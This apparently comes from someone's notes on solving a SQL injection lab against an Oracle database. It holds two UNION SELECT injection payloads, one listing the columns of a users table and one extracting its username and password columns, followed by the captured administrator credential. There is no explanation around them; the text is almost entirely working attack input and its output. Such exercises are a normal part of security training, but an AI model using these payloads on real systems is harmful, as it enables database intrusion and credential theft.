...
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_ODMJXI'--
...
' UNION select USERNAME_EWTSBC, PASSWORD_PTYQAB from USERS_ODMJXI--

administrator
l40y8rqsdqffyklcvwg5
